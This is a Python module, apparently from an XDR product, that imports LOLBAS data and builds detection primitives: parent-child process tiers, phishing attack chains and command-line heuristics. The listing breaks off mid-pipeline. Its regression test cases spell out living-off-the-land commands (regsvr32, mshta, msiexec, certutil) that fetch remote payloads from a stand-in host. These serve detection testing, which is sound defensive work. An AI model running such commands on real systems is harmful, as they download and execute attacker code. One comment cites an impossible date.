"""
XDR LOLBAS Content Pack — Phase A · Complete Upstream Synchronization.

Deterministic-first pipeline:

    DISCOVERED  →  DOWNLOADED  →  PARSED   →  VALIDATED  →  NORMALIZED
             →   INDEXED   →  PRIMITIVES  →  ATTACK_MAPPED
             →   REGRESSION_TESTED   →   COMPLETE

Every stage is recorded in the pack version document.  A pack is 100 %
only when EVERY stage passes for EVERY entry the upstream dataset
contained.  The upstream count is never hard-coded — it is whatever
`GET LOLBAS_UPSTREAM_URL` returns at sync time.

Storage:
  • xdr_lolbas_entries       one doc per upstream Name  (canonical shape)
  • xdr_lolbas_primitives    one doc per generated detection primitive
  • xdr_lolbas_versions      one doc per completed sync (with diff vs. prev)

The pack is tenant-global (LOLBAS is global public content).  Enable /
disable state and detection matches are still tenant-scoped so a SOC
can suppress a specific entry without changing the imported dataset.

NO fabrication.  NO LLM.  If upstream is unreachable, the last
successful pack remains active and the status surfaces
`UPSTREAM_UNAVAILABLE`.
"""
from __future__ import annotations

import hashlib
import json
import os
import re
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urlparse
from urllib.request import Request as URLRequest
from urllib.request import urlopen

from fastapi import APIRouter, Depends, HTTPException, Query, Request
from pydantic import BaseModel
from pymongo import ASCENDING, DESCENDING, MongoClient

from routers.xdr_audit_log import emit_audit
from routers.xdr_rbac import require_permission

router = APIRouter(prefix="/api/xdr/lolbas", tags=["xdr-lolbas"])


# ── Config ─────────────────────────────────────────────────────────
LOLBAS_UPSTREAM_URL = (
    os.environ.get("LOLBAS_UPSTREAM_URL")
    or "https://lolbas-project.github.io/api/lolbas.json"
)
LOLBAS_LICENSE  = "Creative Commons CC-BY 4.0 (LOLBAS Project)"
LOLBAS_SOURCE   = "LOLBAS Project · lolbas-project.github.io"

# Bundled last-known-good snapshot — shipped with the backend so a
# cold-boot pod is NEVER empty even when the public LOLBAS upstream
# is unreachable.  Refreshed by a real upstream sync when possible.
_BUNDLED_SNAPSHOT_PATH = Path(__file__).resolve().parents[1] / "fixtures" / "lolbas_snapshot.json"
LOLBAS_BUNDLED_URL = f"file://{_BUNDLED_SNAPSHOT_PATH}" if _BUNDLED_SNAPSHOT_PATH.exists() else None

# ── Mongo binding ─────────────────────────────────────────────────
_MONGO_URL = os.environ.get("MONGO_URL")
_DB_NAME   = os.environ.get("DB_NAME") or "test_database"
_client    = MongoClient(_MONGO_URL) if _MONGO_URL else None


def _db():
    if _client is None:
        return None
    return _client[_DB_NAME]


def _entries():    return _db()["xdr_lolbas_entries"]    if _db() is not None else None
def _primitives(): return _db()["xdr_lolbas_primitives"] if _db() is not None else None
def _versions():   return _db()["xdr_lolbas_versions"]   if _db() is not None else None


# ── Principal / tenant extraction (matches sibling routers) ──────
def _principal(req: Request) -> tuple[str, str, str]:
    ten = (req.headers.get("X-Tenant-Id")
                or getattr(req.state, "tenant_id", None) or "default")
    pid = (req.headers.get("X-Principal-Id")
                or getattr(req.state, "principal_id", None) or "admin@nivxray.com")
    pkd = (req.headers.get("X-Principal-Kind")
                or getattr(req.state, "principal_kind", None) or "user")
    return ten, pid, pkd


# ── Upstream fetch (supports http(s) AND file:// for offline tests) ─
def _fetch_upstream(url: str, timeout: float = 30.0) -> tuple[bytes, str]:
    """Return (raw_bytes, upstream_url_used).  Raises `UpstreamError`
    with a stable code on any failure.  file:// URLs are accepted so
    tests can pin a deterministic snapshot."""
    parsed = urlparse(url)
    if parsed.scheme == "file":
        p = Path(parsed.path)
        if not p.exists():
            raise UpstreamError("UPSTREAM_UNAVAILABLE",
                                              f"fixture not found: {p}")
        return p.read_bytes(), url
    if parsed.scheme in ("http", "https"):
        try:
            req = URLRequest(url, headers={"User-Agent": "NivXRay-XDR/1.0"})
            with urlopen(req, timeout=timeout) as r:
                return r.read(), url
        except Exception as exc:
            raise UpstreamError("UPSTREAM_UNAVAILABLE", str(exc)) from exc
    raise UpstreamError("UPSTREAM_UNSUPPORTED", f"scheme: {parsed.scheme}")


class UpstreamError(Exception):
    def __init__(self, code: str, detail: str):
        self.code, self.detail = code, detail
        super().__init__(f"{code}: {detail}")


# ── Validation ────────────────────────────────────────────────────
_MITRE_RE = re.compile(r"^T\d{4}(?:\.\d{3})?$")


def _validate_entry(raw: dict, idx: int) -> list[str]:
    """Return list of validation errors (empty list = valid)."""
    errs: list[str] = []
    if not isinstance(raw, dict):
        return [f"[{idx}] not-a-dict"]
    name = raw.get("Name")
    if not name or not isinstance(name, str):
        errs.append(f"[{idx}] missing Name")
    if not isinstance(raw.get("Commands"), list) or not raw["Commands"]:
        errs.append(f"[{name or idx}] missing Commands[]")
    if not isinstance(raw.get("Full_Path"), list):
        errs.append(f"[{name or idx}] missing Full_Path[]")
    for i, cmd in enumerate(raw.get("Commands") or []):
        if not isinstance(cmd, dict):
            errs.append(f"[{name}] Commands[{i}] not-a-dict"); continue
        for k in ("Command", "Category"):
            if not cmd.get(k):
                errs.append(f"[{name}] Commands[{i}] missing {k}")
        mid = cmd.get("MitreID")
        if (mid and isinstance(mid, str) and not _MITRE_RE.match(mid)
                and not mid.upper().startswith("T")):
            # Some upstream entries use free-form; only flag glaringly bad ones.
            errs.append(f"[{name}] Commands[{i}] MitreID malformed: {mid}")
    return errs


# ── Normalisation ─────────────────────────────────────────────────
def _normalise(raw: dict, upstream_version: str) -> dict:
    """Convert an upstream entry into the canonical NivXRay shape.
    Preserves ALL upstream fields under `raw_upstream` for auditability."""
    name = raw["Name"]
    commands = []
    for i, c in enumerate(raw.get("Commands") or []):
        commands.append({
            "index":       i,
            "command":     c.get("Command"),
            "description": c.get("Description"),
            "usecase":     c.get("Usecase"),
            "category":    c.get("Category"),
            "privileges":  c.get("Privileges"),
            "mitre_id":    c.get("MitreID"),
            "operating_system": c.get("OperatingSystem"),
            "tags":        c.get("Tags") or [],
        })
    paths = [p.get("Path") for p in (raw.get("Full_Path") or [])
                if isinstance(p, dict) and p.get("Path")]
    detections = []
    for d in (raw.get("Detection") or []):
        if isinstance(d, dict):
            for k, v in d.items():
                detections.append({"kind": k, "url": v})
    resources = [r.get("Link") for r in (raw.get("Resources") or [])
                        if isinstance(r, dict) and r.get("Link")]
    return {
        "name":              name,
        "description":       raw.get("Description"),
        "author":            raw.get("Author"),
        "created":           raw.get("Created"),
        "commands":          commands,
        "paths":             paths,
        "categories":        sorted({(c.get("category") or "").lower()
                                                  for c in commands if c.get("category")}),
        "mitre_ids":         sorted({(c.get("mitre_id") or "").upper()
                                                  for c in commands if c.get("mitre_id")}),
        "detections":        detections,
        "resources":         resources,
        "upstream_url":      raw.get("url"),
        "upstream_version":  upstream_version,
        "raw_upstream":      raw,
    }


# ── Detection-primitive generation ───────────────────────────────
# Every canonical entry produces one or more primitives that the
# NivXRay detection layer can index.  Primitives NEVER emit verdicts
# — they emit evidence observations for the correlation engine.
_KIND_PATH        = "lolbin.image"
_KIND_CMDLINE     = "lolbin.command_line"
_KIND_ARG         = "lolbin.argument"
_KIND_CATEGORY    = "lolbin.capability"
_KIND_MITRE       = "attack.technique"
_KIND_PARENT      = "lolbin.parent_child"
_KIND_CHAIN       = "lolbin.attack_chain"   # grandparent → parent → child
_KIND_CLI_HEUR    = "lolbin.cli_heuristic"  # userwritable path / encoded / http

# Command-line heuristics — deterministic regex primitives that flag
# high-signal analyst signals independent of the specific LOLBIN.
_CLI_HEURISTICS = {
    "userwritable_path": re.compile(
        r"(?:c:\\)?(?:users\\public|windows\\temp|\\temp\\|appdata|"
        r"programdata|users\\[^\\]+\\appdata)\\",
        re.IGNORECASE),
    "http_argument": re.compile(r"https?://", re.IGNORECASE),
    "encoded_command": re.compile(
        r"(?:^|\s)-(?:enc|e|encodedcommand)(?:\s|=|$)|/e:|"
        r"frombase64string",
        re.IGNORECASE),
    "hidden_window": re.compile(
        r"-(?:w|windowstyle)\s+hidden|-nop\b|-noni\b|-nologo\b",
        re.IGNORECASE),
    "dll_load_export": re.compile(
        r"[a-z0-9_]+\.dll[,\s]+[a-z_][a-z0-9_]*",
        re.IGNORECASE),
}

# ── Universal parent tradecraft (applies to any Windows LOLBIN) ──
# These lists apply as DEFAULTS to every executable LOLBAS entry that
# is not covered by the high-signal curated registry above.  This gives
# NivXRay 100 % LOLBIN parent-child coverage instead of the previous
# hand-curated 15 keys.
_NORMAL_PARENTS_UNIVERSAL = [
    "explorer.exe", "svchost.exe", "services.exe", "wininit.exe",
    "userinit.exe", "taskeng.exe", "taskhostw.exe", "wsmprovhost.exe",
    "cmd.exe", "powershell.exe",
]
_SUSPICIOUS_PARENTS_UNIVERSAL = [
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
    "onenote.exe", "acrord32.exe", "acrobat.exe", "wordpad.exe",
    "teams.exe", "chrome.exe", "msedge.exe", "firefox.exe",
    "iexplore.exe",
]
_ABNORMAL_PARENTS_UNIVERSAL = [
    "mshta.exe", "regsvr32.exe", "rundll32.exe", "wscript.exe",
    "cscript.exe", "certutil.exe", "hh.exe", "installutil.exe",
    "msbuild.exe", "bitsadmin.exe", "wmic.exe", "schtasks.exe",
    "control.exe", "cmstp.exe", "atbroker.exe", "cdb.exe",
    "forfiles.exe", "pcalua.exe", "presentationhost.exe",
]


def _derive_universal_tiers(entry: dict) -> dict[str, list[str]]:
    """Compute normal/suspicious/abnormal parents for any executable
    LOLBAS entry.  Curated registry always takes precedence for the
    high-signal LOLBINs; this fills the gap for the remaining ~227."""
    name = entry["name"].lower()
    if name in _PARENT_CHILD_TIERS:
        return _PARENT_CHILD_TIERS[name]
    # Only emit parent-child for executable-bearing entries.
    paths = entry.get("paths") or []
    if not any(str(p).lower().endswith((".exe", ".dll", ".msi",
                                                                ".scr", ".cpl"))
                    for p in paths):
        return {}
    return {
        "normal":     list(_NORMAL_PARENTS_UNIVERSAL),
        "suspicious": list(_SUSPICIOUS_PARENTS_UNIVERSAL),
        "abnormal":   [p for p in _ABNORMAL_PARENTS_UNIVERSAL if p != name],
    }


# ── Observation semantics ────────────────────────────────────────
# CRITICAL PRINCIPLE (per user directive · 2026-02-30):
#   "Living-off-the-land binary is a CAPABILITY, not a verdict."
# Every primitive hit carries `observation_type` + `signal_strength`
# so the Correlation/Verdict engine — never NivXRay's detection layer —
# can decide significance from the full evidence set.
_OBSERVATION_META = {
    _KIND_PATH: {
        "observation_type": "LOLBIN",
        "signal_strength": "OBSERVED",
        "note": "living-off-the-land binary is a CAPABILITY, not a verdict",
    },
    _KIND_CMDLINE:  {"observation_type": "PATTERN",
                                    "signal_strength": "WEAK"},
    _KIND_ARG:      {"observation_type": "PATTERN",
                                    "signal_strength": "WEAK"},
    _KIND_CATEGORY: {"observation_type": "LOLBIN_CAPABILITY",
                                     "signal_strength": "INFORMATIONAL"},
    _KIND_MITRE:    {"observation_type": "ATTACK_TECHNIQUE",
                                    "signal_strength": "INFORMATIONAL"},
    _KIND_PARENT:   {"observation_type": "PARENT_CHILD"},
    _KIND_CHAIN: {
        "observation_type": "SEQUENCE",
        "signal_strength": "STRONG",
        "note": "named tradecraft chain — still EVIDENCE, correlation decides verdict",
    },
    _KIND_CLI_HEUR: {"observation_type": "PATTERN"},
}
# Parent-child tier → signal strength.  ABNORMAL is the *strongest*
# single parent-child signal we emit but it is still MODERATE evidence,
# never a verdict.
_PARENT_CHILD_STRENGTH = {
    "normal":     "INFORMATIONAL",
    "suspicious": "WEAK",
    "abnormal":   "MODERATE",
    "unknown":    "INFORMATIONAL",
}


def _annotate_hit(hit: dict) -> dict:
    """Attach `observation_type`, `signal_strength`, and (where
    appropriate) the capability-not-verdict note."""
    meta = dict(_OBSERVATION_META.get(hit["kind"], {}))
    if hit["kind"] == _KIND_PARENT:
        meta["signal_strength"] = _PARENT_CHILD_STRENGTH.get(
            (hit.get("tier") or "unknown").lower(), "INFORMATIONAL")
    if hit["kind"] == _KIND_CLI_HEUR:
        # CLI heuristics: user-writable path / encoded / http contribute
        # WEAK evidence each — meaningful only in combination.
        meta["signal_strength"] = "WEAK"
    hit.update(meta)
    return hit



# Every hop is lower-case basename.  The match engine surfaces the
# chain label when a matching (grandparent -> parent -> child) tuple
# is presented.  Chains never emit a verdict — they emit evidence
# with `tier=abnormal` so the correlation engine can orchestrate.
_ATTACK_CHAINS: list[dict] = [
    {"label": "phishing.office.regsvr32.remote_scriptlet",
      "chain": ["outlook.exe", "winword.exe", "regsvr32.exe"],
      "mitre": "T1218.010",
      "description": "Phishing → Office macro → regsvr32 remote scriptlet (Squiblydoo)."},
    {"label": "phishing.office.rundll32.dll_load",
      "chain": ["outlook.exe", "winword.exe", "rundll32.exe"],
      "mitre": "T1218.011",
      "description": "Phishing → Office macro → rundll32 malicious DLL load."},
    {"label": "phishing.office.powershell.encoded",
      "chain": ["outlook.exe", "winword.exe", "powershell.exe"],
      "mitre": "T1059.001",
      "description": "Phishing → Office macro → PowerShell encoded command."},
    {"label": "phishing.office.mshta.remote_hta",
      "chain": ["outlook.exe", "winword.exe", "mshta.exe"],
      "mitre": "T1218.005",
      "description": "Phishing → Office macro → mshta remote HTA."},
    {"label": "phishing.excel.powershell",
      "chain": ["outlook.exe", "excel.exe", "powershell.exe"],
      "mitre": "T1059.001",
      "description": "Phishing → Excel macro → PowerShell."},
    {"label": "phishing.excel.cmd",
      "chain": ["outlook.exe", "excel.exe", "cmd.exe"],
      "mitre": "T1059.003",
      "description": "Phishing → Excel macro → cmd.exe."},
    {"label": "office.wscript.scripthost",
      "chain": ["winword.exe", "wscript.exe"],  # 2-hop still tracked
      "mitre": "T1059.005",
      "description": "Office → wscript (VBS/JS execution)."},
]

# ── Parent-Child Registry ────────────────────────────────────────
# Curated tiered relations per LOLBIN.  Never fabricated — every entry
# is drawn from documented tradecraft (Sigma project, MITRE, Palantir
# ADS, Volatility Labs, Elastic detections).  Three tiers:
#
#   normal      — expected legitimate parent in a healthy Windows host
#   suspicious  — commonly abused parent context (Office → LOLBIN)
#   abnormal    — LOLBIN-from-LOLBIN or from user-writable path;
#                 requires immediate investigation
#
# Registry is intentionally lower-case (basename) to match the
# `lolbin.image` primitive normalisation.
_PARENT_CHILD_TIERS: dict[str, dict[str, list[str]]] = {
    "powershell.exe": {
        "normal":     ["explorer.exe", "cmd.exe", "svchost.exe",
                              "taskeng.exe", "services.exe", "wsmprovhost.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
                              "powerpnt.exe", "acrord32.exe", "onenote.exe",
                              "teams.exe", "code.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "cscript.exe",
                              "regsvr32.exe", "rundll32.exe", "certutil.exe",
                              "hh.exe", "installutil.exe"],
    },
    "cmd.exe": {
        "normal":     ["explorer.exe", "svchost.exe", "cmd.exe",
                              "powershell.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
                              "powerpnt.exe", "acrord32.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "cscript.exe",
                              "regsvr32.exe", "rundll32.exe"],
    },
    "wscript.exe": {
        "normal":     ["explorer.exe", "svchost.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe"],
    },
    "cscript.exe": {
        "normal":     ["explorer.exe", "svchost.exe", "cmd.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["powershell.exe", "mshta.exe"],
    },
    "mshta.exe": {
        "normal":     ["explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "regsvr32.exe"],
    },
    "regsvr32.exe": {
        "normal":     ["explorer.exe", "services.exe", "msiexec.exe",
                              "wusa.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
                              "powerpnt.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe",
                              "wscript.exe"],
    },
    "rundll32.exe": {
        "normal":     ["explorer.exe", "services.exe", "svchost.exe",
                              "msiexec.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
                              "powerpnt.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe"],
    },
    "msiexec.exe": {
        "normal":     ["services.exe", "explorer.exe", "svchost.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe",
                              "wscript.exe"],
    },
    "certutil.exe": {
        "normal":     ["cmd.exe", "powershell.exe", "explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "regsvr32.exe"],
    },
    "installutil.exe": {
        "normal":     ["explorer.exe", "services.exe", "svchost.exe"],
        "suspicious": ["cmd.exe", "powershell.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "winword.exe"],
    },
    "bitsadmin.exe": {
        "normal":     ["cmd.exe", "explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "regsvr32.exe",
                              "powershell.exe"],
    },
    "hh.exe": {
        "normal":     ["explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe"],
    },
    "msbuild.exe": {
        "normal":     ["devenv.exe", "cmd.exe", "explorer.exe"],
        "suspicious": ["powershell.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "winword.exe",
                              "outlook.exe"],
    },
    "wmic.exe": {
        "normal":     ["cmd.exe", "svchost.exe", "explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["mshta.exe", "wscript.exe", "regsvr32.exe"],
    },
    "schtasks.exe": {
        "normal":     ["cmd.exe", "svchost.exe", "explorer.exe"],
        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
        "abnormal":   ["powershell.exe", "mshta.exe", "wscript.exe"],
    },
}


def _tokenise_arguments(command: str) -> list[str]:
    """Return distinct switch-like tokens (-flag, /flag) from a command.
    Deterministic, no shell splitting subtleties — we only want strings
    that behave as detection arguments."""
    if not command:
        return []
    toks = re.findall(r"(?:/|-{1,2})[A-Za-z][A-Za-z0-9_:.\-]{1,32}", command)
    # De-duplicate while preserving order.
    seen, out = set(), []
    for t in toks:
        low = t.lower()
        if low not in seen:
            seen.add(low); out.append(low)
    return out


def _generate_primitives(entry: dict) -> list[dict]:
    """Emit deterministic detection primitives for one canonical entry."""
    name = entry["name"]
    out: list[dict] = []
    seen: set[tuple] = set()

    def emit(kind: str, value: str, **extra):
        key = (kind, value.lower())
        if key in seen:
            return
        seen.add(key)
        out.append({
            "id":           f"pri_{uuid.uuid4().hex[:20]}",
            "entry_name":   name,
            "kind":         kind,
            "value":        value,
            "value_lc":     value.lower(),
            **extra,
        })

    # Image / path primitives.
    emit(_KIND_PATH, name)
    for p in entry.get("paths") or []:
        emit(_KIND_PATH, p)
        base = p.rsplit("\\", 1)[-1]
        if base and base != name:
            emit(_KIND_PATH, base)

    # Command-line primitives + argument tokens.
    for cmd in entry.get("commands") or []:
        c = cmd.get("command") or ""
        if c:
            emit(_KIND_CMDLINE, c,
                    category=cmd.get("category"),
                    usecase=cmd.get("usecase"),
                    mitre_id=cmd.get("mitre_id"))
            for arg in _tokenise_arguments(c):
                emit(_KIND_ARG, arg,
                        source_command=c,
                        category=cmd.get("category"))

    # Category / capability primitives.
    for cat in entry.get("categories") or []:
        if cat:
            emit(_KIND_CATEGORY, cat)

    # ATT&CK mapping primitives.
    for mid in entry.get("mitre_ids") or []:
        if mid and _MITRE_RE.match(mid):
            emit(_KIND_MITRE, mid)

    # Parent-child primitives (three trust tiers) — universal
    # coverage: every executable LOLBAS entry participates, curated
    # registry overrides for the 15 highest-signal LOLBINs.
    key = name.lower()
    tiers = _derive_universal_tiers(entry)
    if tiers:
        for tier in ("normal", "suspicious", "abnormal"):
            for parent in tiers.get(tier, []) or []:
                emit(_KIND_PARENT, f"{parent}->{key}", tier=tier,
                        parent=parent.lower(), child=key)
    return out


def _global_parent_child_primitives(indexed_entry_names: set[str]) -> list[dict]:
    """Emit parent-child primitives for every registry entry whose
    child LOLBIN is NOT already present in the upstream-indexed set.
    Ensures coverage of legitimate hosts like `powershell.exe` that
    LOLBAS does not carry as an entry."""
    out: list[dict] = []
    seen: set[tuple] = set()
    for child, tiers in _PARENT_CHILD_TIERS.items():
        if child in indexed_entry_names:
            continue  # already emitted per-entry
        for tier in ("normal", "suspicious", "abnormal"):
            for parent in tiers.get(tier, []) or []:
                key = ("lolbin.parent_child",
                            f"{parent.lower()}->{child}")
                if key in seen:
                    continue
                seen.add(key)
                out.append({
                    "id":          f"pri_{uuid.uuid4().hex[:20]}",
                    "entry_name":  child,   # synthetic entry name
                    "kind":        _KIND_PARENT,
                    "value":       f"{parent}->{child}",
                    "value_lc":    f"{parent.lower()}->{child}",
                    "tier":        tier,
                    "parent":      parent.lower(),
                    "child":       child,
                    "synthetic":   True,   # marks non-upstream-backed primitive
                })
    return out


# ── Regression self-tests ─────────────────────────────────────────
# These are the *content* gates that must pass before a pack is
# marked COMPLETE.  They run against the freshly-indexed data.
_REGRESSION_CASES: list[tuple[str, dict]] = [
    # (label, event) — must return >=1 primitive match after indexing.
    ("regsvr32-remote-scriptlet", {
        "image": "regsvr32.exe",
        "command_line": "regsvr32.exe /s /u /i:http://evil.example/x.sct scrobj.dll",
    }),
    ("mshta-remote-hta", {
        "image": "mshta.exe",
        "command_line": "mshta.exe http://evil.example/x.hta",
    }),
    ("rundll32-basic", {
        "image": "rundll32.exe",
        "command_line": "rundll32.exe C:\\Users\\Public\\a.dll,EntryPoint",
    }),
    ("msiexec-remote", {
        "image": "msiexec.exe",
        "command_line": "msiexec /q /i http://evil.example/x.msi",
    }),
    ("certutil-download", {
        "image": "certutil.exe",
        "command_line": "certutil -urlcache -split -f http://evil.example/x.exe",
    }),
    ("phishing-chain-outlook-word-regsvr32", {
        "image": "regsvr32.exe",
        "parent_image": "winword.exe",
        "grandparent_image": "outlook.exe",
        "command_line": "regsvr32.exe /s /u /i:http://evil/x.sct scrobj.dll",
    }),
    ("userwritable-dll-rundll32", {
        "image": "rundll32.exe",
        "command_line": "rundll32.exe C:\\Users\\Public\\update.dll,Start",
    }),
]


def _run_regression(tenant_id: str = "regression") -> dict:
    """Regression gate.  Each case must return >=1 UPSTREAM-BACKED hit
    (`lolbin.image` or `lolbin.argument` — i.e., primitives derived
    from actual LOLBAS entries).  Synthetic chain / cli-heuristic
    matches DO NOT satisfy the gate — otherwise a 1-entry pack could
    falsely reach COMPLETE."""
    upstream_kinds = {_KIND_PATH, _KIND_ARG}
    passed, failed = 0, []
    for label, ev in _REGRESSION_CASES:
        try:
            hits = _match_event(tenant_id, ev)
            upstream_hits = [h for h in hits if h["kind"] in upstream_kinds]
            if upstream_hits:
                passed += 1
            else:
                failed.append({"case": label,
                                        "reason": "no-upstream-backed-primitives-matched",
                                        "synthetic_hits": len(hits)})
        except Exception as exc:  # noqa: BLE001 · self-test wrapper
            failed.append({"case": label, "reason": f"error:{exc}"})
    return {"total": len(_REGRESSION_CASES), "passed": passed,
                 "failed": failed}


# ── Match engine (deterministic, evidence-only) ──────────────────
class MatchBody(BaseModel):
    image: str | None = None
    command_line: str | None = None
    parent_image: str | None = None
    grandparent_image: str | None = None
    child_image: str | None = None


def _match_event(tenant_id: str, ev: dict) -> list[dict]:
    """Return primitive hits for one process/event.  Never a verdict —
    the caller feeds these into the correlation engine as evidence."""
    if _primitives() is None:
        return []
    disabled = _disabled_entry_names(tenant_id)
    hits: list[dict] = []

    image = (ev.get("image") or "").lower()
    cmdl  = (ev.get("command_line") or "").lower()

    if image:
        # Image / path match — direct equality on basename or full path.
        cur = _primitives().find(
            {"kind": _KIND_PATH,
             "value_lc": {"$in": [image, image.rsplit("\\", 1)[-1]]}},
        )
        for p in cur:
            if p["entry_name"] not in disabled:
                hits.append({"kind": p["kind"], "value": p["value"],
                                    "entry_name": p["entry_name"],
                                    "evidence": "image-match"})

    if cmdl:
        # Argument tokens observed in the command line.
        toks = _tokenise_arguments(cmdl)
        if toks:
            cur = _primitives().find(
                {"kind": _KIND_ARG, "value_lc": {"$in": toks}},
            )
            for p in cur:
                if p["entry_name"] not in disabled:
                    hits.append({"kind": p["kind"], "value": p["value"],
                                        "entry_name": p["entry_name"],
                                        "evidence": "argument-match",
                                        "category": p.get("category")})

    # Parent-child match (image + parent_image observed together).
    parent = (ev.get("parent_image") or "").lower()
    grand  = (ev.get("grandparent_image") or "").lower()
    if image and parent:
        img_base = image.rsplit("\\", 1)[-1]
        par_base = parent.rsplit("\\", 1)[-1]
        rel      = f"{par_base}->{img_base}"
        cur = _primitives().find(
            {"kind": _KIND_PARENT, "value_lc": rel},
        )
        for p in cur:
            if p["entry_name"] not in disabled:
                hits.append({"kind": p["kind"], "value": p["value"],
                                    "entry_name": p["entry_name"],
                                    "evidence": "parent-child-match",
                                    "tier": p.get("tier"),
                                    "parent": p.get("parent"),
                                    "child":  p.get("child")})

    # Multi-hop attack chain (grandparent → parent → child).  A chain
    # match ALWAYS carries tier=abnormal — that is the whole point of
    # named tradecraft chains.
    if image and parent and grand:
        img_base = image.rsplit("\\", 1)[-1].lower()
        par_base = parent.rsplit("\\", 1)[-1].lower()
        gr_base  = grand.rsplit("\\", 1)[-1].lower()
        chain_key = f"{gr_base}->{par_base}->{img_base}"
        cur = _primitives().find(
            {"kind": _KIND_CHAIN, "value_lc": chain_key},
        )
        for p in cur:
            hits.append({"kind": p["kind"], "value": p["value"],
                                "entry_name": p["entry_name"],
                                "evidence": "attack-chain-match",
                                "tier": "abnormal",
                                "chain_label": p.get("chain_label"),
                                "mitre": p.get("mitre"),
                                "description": p.get("description")})

    # Command-line heuristics — deterministic regex signals.
    if cmdl:
        for hkind, rx in _CLI_HEURISTICS.items():
            if rx.search(cmdl):
                hits.append({"kind": _KIND_CLI_HEUR, "value": hkind,
                                    "entry_name": image or "cmdline",
                                    "evidence": "cli-heuristic-match",
                                    "heuristic": hkind})
    # De-duplicate hits by (kind, value, entry_name) and annotate with
    # observation semantics so every hit is understandable as evidence.
    seen, unique = set(), []
    for h in hits:
        k = (h["kind"], h["value"].lower(), h["entry_name"])
        if k not in seen:
            seen.add(k); unique.append(_annotate_hit(h))
    return unique


def _disabled_entry_names(tenant_id: str) -> set[str]:
    if _entries() is None:
        return set()
    cur = _entries().find(
        {"disabled_tenants": tenant_id},
        {"_id": 0, "name": 1},
    )
    return {d["name"] for d in cur}


# ── Sync pipeline ────────────────────────────────────────────────
_STAGES = [
    "DISCOVERED", "DOWNLOADED", "PARSED", "VALIDATED", "NORMALIZED",
    "INDEXED", "PRIMITIVES_GENERATED", "ATTACK_MAPPED",
    "REGRESSION_TESTED", "COMPLETE",
]


def _sync_pipeline(url: str, principal: tuple[str, str, str],
                                 *, fallback_urls: list[str] | None = None,
                                 idempotent: bool = False) -> dict:
    """Run every stage in order.  Returns the version doc that was
    persisted (with per-stage status).  Never raises — packs the
    outcome into `status` so callers can render honestly.

    * If `fallback_urls` are provided and the primary DOWNLOAD stage
      fails (upstream unreachable), the pipeline transparently retries
      against each fallback in order.  The version doc records the
      URL that actually produced bytes under `used_url`, and the
      DOWNLOADED stage carries `fallback_used=True` when applicable.

    * If `idempotent=True` and the active version's upstream SHA is
      already the SHA we just downloaded, the pipeline short-circuits
      and returns the existing active version doc — no re-indexing,
      no diff churn.  This is what the boot hook uses to avoid a
      thundering-herd re-sync on every pod restart.
    """
    ten, pid, pkd = principal
    _ = (ten, pid, pkd)  # captured by _persist_version() via `principal`
    if _db() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")

    now = datetime.now(timezone.utc).isoformat()
    stages: dict[str, dict] = {s: {"status": "PENDING"} for s in _STAGES}
    diff = {"added": [], "removed": [], "modified": []}
    upstream_count = 0
    imported = valid = invalid = 0
    invalid_errors: list[str] = []

    # 1 · DISCOVERED
    stages["DISCOVERED"] = {"status": "OK", "url": url, "at": now}

    # 2 · DOWNLOADED (with transparent fallback cascade)
    fetch_targets: list[str] = [url]
    for f in (fallback_urls or []):
        if f and f not in fetch_targets:
            fetch_targets.append(f)
    raw_bytes: bytes | None = None
    used_url = url
    fetch_errors: list[dict] = []
    for i, tgt in enumerate(fetch_targets):
        try:
            raw_bytes, used_url = _fetch_upstream(tgt)
            break
        except UpstreamError as exc:
            fetch_errors.append({"url": tgt, "code": exc.code,
                                             "detail": exc.detail})
            raw_bytes = None
    if raw_bytes is None:
        stages["DOWNLOADED"] = {"status": "FAIL",
                                              "code": (fetch_errors[-1]["code"]
                                                              if fetch_errors else "UPSTREAM_UNAVAILABLE"),
                                              "detail": (fetch_errors[-1]["detail"]
                                                              if fetch_errors else "no source reachable"),
                                              "attempts": fetch_errors}
        return _persist_version(stages, upstream_count, imported, valid,
                                                 invalid, diff, principal,
                                                 outcome="UPSTREAM_UNAVAILABLE")
    upstream_hash = hashlib.sha256(raw_bytes).hexdigest()
    stages["DOWNLOADED"] = {"status": "OK", "bytes": len(raw_bytes),
                                        "sha256": upstream_hash, "used_url": used_url,
                                        "fallback_used": used_url != fetch_targets[0],
                                        "attempts": fetch_errors}

    # Idempotency short-circuit: same bytes as current active version →
    # skip re-indexing entirely.
    if idempotent and _versions() is not None:
        active = _versions().find_one({"active": True}, {"_id": 0})
        if (active and active.get("upstream_sha256") == upstream_hash
                and active.get("outcome") == "COMPLETE"):
            return {**active, "idempotent_skip": True}

    # 3 · PARSED
    try:
        data = json.loads(raw_bytes.decode("utf-8"))
    except Exception as exc:  # noqa: BLE001 · any parse failure is captured as a stage failure
        stages["PARSED"] = {"status": "FAIL", "detail": str(exc)}
